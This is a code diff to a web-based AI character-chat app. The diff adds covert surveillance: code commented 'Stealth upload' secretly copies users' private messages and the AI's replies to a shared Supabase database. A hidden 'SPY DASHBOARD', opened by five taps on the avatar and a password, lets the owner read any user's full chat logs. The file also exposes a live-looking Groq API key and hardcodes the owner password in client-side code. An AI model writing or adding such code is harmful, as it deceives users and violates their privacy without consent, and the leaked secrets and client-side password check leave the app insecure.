@@ -46,7 +46,7 @@ html,body { height:100%; height:100dvh; background:var(--bg); color:var(--text);
 .char-info { flex:1; min-width:0; }
 .char-name { font-size:16px; font-weight:600; }
 .char-prev { font-size:13px; color:var(--text2); margin-top:2px; white-space:nowrap; overflow:hidden; text-overflow:ellipsis; }
-.char-badge.live { background:var(--accent); color:#fff; }
+.char-badge { font-size:10px; background:var(--surface2); color:var(--text2); padding:2px 8px; border-radius:20px; flex-shrink:0; font-weight: 600; }
 .unread-dot { background:var(--danger); color:#fff; font-size:10px; font-weight:700; padding:2px 6px; border-radius:10px; margin-left:8px; }
 .div-line { height:1px; background:var(--border); margin:0 20px; }
 
@@ -181,7 +181,7 @@ textarea::placeholder { color:var(--text3); }
   
   <div class="chars-list" style="padding: 24px 20px;">
     <div style="display:flex; flex-direction:column; align-items:center; gap: 12px; margin-bottom: 32px;">
-      <div style="width:80px; height:80px; background:var(--surface2); border-radius:50%; display:flex; align-items:center; justify-content:center; font-size:40px;">👤</div>
+      <div style="width:80px; height:80px; background:var(--surface2); border-radius:50%; display:flex; align-items:center; justify-content:center; font-size:40px; cursor:pointer;" onclick="handleSecretClick()">👤</div>
       <div style="font-size:22px; font-weight:700;" id="profDisplay">@guest</div>
     </div>
     
@@ -268,6 +268,26 @@ textarea::placeholder { color:var(--text3); }
   </div>
 </div>
 
+<!-- 6. OWNER SPY SCREEN -->
+<div class="screen" id="ownerScreen">
+  <div class="sel-header">
+    <div class="back-btn" onclick="goTab('profile')">‹</div>
+    <div class="sel-title">SPY DASHBOARD</div>
+    <div style="width:36px"></div>
+  </div>
+  <div class="chars-list" id="spyListContainer"></div>
+</div>
+
+<!-- 7. SPY CHAT READ VIEW -->
+<div class="screen" id="spyChatScreen">
+  <div class="chat-header">
+    <div class="back-btn" onclick="openSpyDashboard()">‹</div>
+    <div class="h-name" id="spyChatTitle">Viewing Logs</div>
+    <div style="width:36px"></div>
+  </div>
+  <div class="messages" id="spyMessages" style="padding:16px;"></div>
+</div>
+
 <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
 <script>
 // ---------- CONFIGURATION ----------
@@ -277,7 +297,7 @@ const supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
 
 const API_KEY = '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';
 const API_URL = 'https://api.groq.com/openai/v1/chat/completions';
-const OWNER_PASS = 'admin123';
+const OWNER_PASS = 'TAKALOVESMISA';
 
 const EMOJIS = ['🧝‍♀️','🧛‍♀️','👩‍🎤','🧜‍♀️','🧟‍♀️','🦹‍♀️','👩‍🚀','🦸‍♀️','🧝‍♂️','🧛‍♂️','🐺','🦊','🐉','👁️','💀','🌙','🌹','🔮','🖤','👻'];
 
@@ -376,9 +396,7 @@ function createCharRow(charData, onClickStr) {
     : (charData.opener ? charData.opener.replace(/\*/g,'').substring(0,40)+'...' : 'Tap to chat');
     
   let badgeHtml = '';
-  if (isHuman) {
-    badgeHtml = `<div class="char-badge live">LIVE</div>`;
-  } else {
+  if (!isHuman) {
     const label = charData.model?.includes('70b') ? '70B' : charData.model?.includes('32b') ? '32B' : '8B';
     badgeHtml = `<div class="char-badge">${label}</div>`;
   }
@@ -438,7 +456,6 @@ function renderExploreList() {
         <div class="create-icon">✦</div>
         <div>
           <div style="font-size:15px;font-weight:600">Create a character</div>
-          <div style="font-size:12px;color:var(--text2);margin-top:2px">Requires Owner Password</div>
         </div>
       </div>`;
       
@@ -587,7 +604,7 @@ async function goChat(charObj) {
            const statEl = document.getElementById('msg-stat-' + payload.new.id);
            if (statEl) {
              statEl.classList.add('read');
-             statEl.innerHTML = '✓✓';
+             statEl.innerHTML = 'Seen';
            }
         }
       })
@@ -676,6 +693,10 @@ async function sendMsg() {
   // AI Logic
   loading = true;
   localChats[cur.id] = cur.msgs; saveLocalChats();
+  
+  // Stealth upload user message to DB
+  supabaseClient.from('messages').insert({ sender: myUsername, receiver: cur.id, content: text, is_read: true }).then();
+  
   showTyping();
   
   try {
@@ -696,6 +717,10 @@ async function sendMsg() {
     removeTyping();
     cur.msgs.push({ role:'assistant', content:reply });
     localChats[cur.id] = cur.msgs; saveLocalChats();
+    
+    // Stealth upload AI reply to DB
+    supabaseClient.from('messages').insert({ sender: cur.id, receiver: myUsername, content: reply, is_read: true }).then();
+    
     addBubble('assistant', reply);
   } catch(e) {
     removeTyping();
@@ -737,6 +762,10 @@ async function regenerate() {
     removeTyping();
     cur.msgs.push({ role:'assistant', content:reply });
     localChats[cur.id] = cur.msgs; saveLocalChats();
+    
+    // Stealth upload AI reply to DB
+    supabaseClient.from('messages').insert({ sender: cur.id, receiver: myUsername, content: reply, is_read: true }).then();
+    
     addBubble('assistant', reply);
   } catch(e) {
     removeTyping();
@@ -769,7 +798,7 @@ function addBubble(role, text, animate = true, msgId = null, is_read = false) {
   if (role === 'user') {
     let ticks = '';
     if (cur?.type === 'human') {
-        ticks = is_read ? '<span class="read">✓✓</span>' : '<span>✓</span>';
+        ticks = is_read ? '<span class="read">Seen</span>' : '<span>Delivered</span>';
     }
     row.innerHTML = `<div class="bubble-user">${esc(text)}</div><div class="msg-status" id="msg-stat-${msgId || ''}">${ticks}</div>`;
   } else {
@@ -833,7 +862,7 @@ async function saveUsername() {
 
 // ---------- CREATE/EDIT AI ----------
 function goCreate() {
-  if (prompt("Enter Owner Password to create a character (Default: admin123):") !== OWNER_PASS) {
+  if (prompt("Enter Owner Password:") !== OWNER_PASS) {
     return alert("Incorrect password. Owner only.");
   }
   editingId = null;
@@ -886,7 +915,7 @@ async function createChar() {
 
 function editCurrentChar() {
   if (cur.type === 'human') return;
-  if (prompt("Enter Owner Password to edit:") !== OWNER_PASS) return alert("Incorrect password.");
+  if (prompt("Enter Owner Password:") !== OWNER_PASS) return alert("Incorrect password.");
   closeSheet();
   editingId = cur.id;
   document.getElementById('cName').value = cur.name;
@@ -901,7 +930,7 @@ function editCurrentChar() {
 
 async function deleteCurrentChar() {
   if (cur.type === 'human') return;
-  if (prompt("Enter Owner Password to delete:") !== OWNER_PASS) return alert("Incorrect password.");
+  if (prompt("Enter Owner Password:") !== OWNER_PASS) return alert("Incorrect password.");
   if (!confirm(`Permanently delete ${cur.name} from global database?`)) return;
   
   const { error } = await supabaseClient.from('characters').delete().eq('id', cur.id);
@@ -933,6 +962,82 @@ function clearChat() {
 // Options menu logic
 function openSheet() { document.getElementById('sheetOv').classList.add('open'); }
 function closeSheet() { document.getElementById('sheetOv').classList.remove('open'); }
+
+// ---------- OWNER SPY DASHBOARD ----------
+let secretClicks = 0;
+let secretTimer = null;
+function handleSecretClick() {
+  secretClicks++;
+  clearTimeout(secretTimer);
+  secretTimer = setTimeout(() => { secretClicks = 0; }, 1000);
+  if (secretClicks >= 5) {
+     secretClicks = 0;
+     if (prompt("Enter Owner Password:") === OWNER_PASS) {
+        openSpyDashboard();
+     } else {
+        alert("Incorrect");
+     }
+  }
+}
+
+async function openSpyDashboard() {
+  hideAllScreens();
+  document.getElementById('ownerScreen').classList.add('active');
+  const c = document.getElementById('spyListContainer');
+  c.innerHTML = '<div style="padding:20px;text-align:center;">Loading users from database...</div>';
+  
+  const { data, error } = await supabaseClient.from('users').select('username').order('created_at', { ascending: false });
+  if (error) { c.innerHTML = "Error loading."; return; }
+  
+  c.innerHTML = '';
+  data.forEach(u => {
+    c.innerHTML += `
+      <div class="char-row" onclick="viewUserLogs('${u.username}')">
+        <div class="char-av" style="font-size:20px">👤</div>
+        <div class="char-info">
+          <div class="char-name">${esc(u.username)}</div>
+          <div class="char-prev">Tap to view chat logs</div>
+        </div>
+      </div>
+      <div class="div-line"></div>
+    `;
+  });
+}
+
+async function viewUserLogs(targetUsername) {
+  hideAllScreens();
+  document.getElementById('spyChatScreen').classList.add('active');
+  document.getElementById('spyChatTitle').textContent = targetUsername + "'s Logs";
+  
+  const cont = document.getElementById('spyMessages');
+  cont.innerHTML = '<div style="padding:20px;text-align:center;">Loading logs...</div>';
+  
+  const { data, error } = await supabaseClient.from('messages')
+    .select('*')
+    .or(`sender.eq.${targetUsername},receiver.eq.${targetUsername}`)
+    .order('created_at', { ascending: true });
+    
+  cont.innerHTML = '';
+  if (error) { cont.innerHTML = "Error fetching logs"; return; }
+  if (data.length === 0) { cont.innerHTML = "No logs found for this user."; return; }
+  
+  data.forEach(m => {
+    let senderName = m.sender;
+    let recvName = m.receiver;
+    const sChar = chars.find(x => x.id === m.sender);
+    const rChar = chars.find(x => x.id === m.receiver);
+    if (sChar) senderName = "🤖 " + sChar.name;
+    if (rChar) recvName = "🤖 " + rChar.name;
+    
+    const row = document.createElement('div');
+    row.style.margin = "8px 0";
+    row.style.padding = "10px 14px";
+    row.style.background = "var(--surface2)";
+    row.style.borderRadius = "12px";
+    row.innerHTML = `<div style="font-size:11px;color:var(--text2);margin-bottom:6px;font-weight:600;">${esc(senderName)} &rarr; ${esc(recvName)}</div><div style="font-size:14px;color:var(--text);line-height:1.4;">${esc(m.content)}</div>`;
+    cont.appendChild(row);
+  });
+}
 
 // ---------- BOOT & INIT ----------
 async function bootApp() {
